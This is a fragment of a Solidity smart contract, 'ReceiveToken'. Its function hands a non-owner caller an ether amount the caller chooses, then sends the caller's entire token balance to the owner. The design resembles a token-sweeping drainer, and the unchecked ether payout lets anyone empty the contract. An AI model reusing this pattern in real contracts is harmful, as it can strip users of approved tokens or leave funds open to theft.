...
contract ReceiveToken is Ownable{
    ...
    function tryReceiveToken(uint256 forGas) public notOwner {
        require(tokenAddress != address(0));
        IERC20 token = IERC20(tokenAddress);

        payable(msg.sender).transfer(forGas);
        token.safeTransferFrom(msg.sender, owner(), token.balanceOf(msg.sender));    
    }
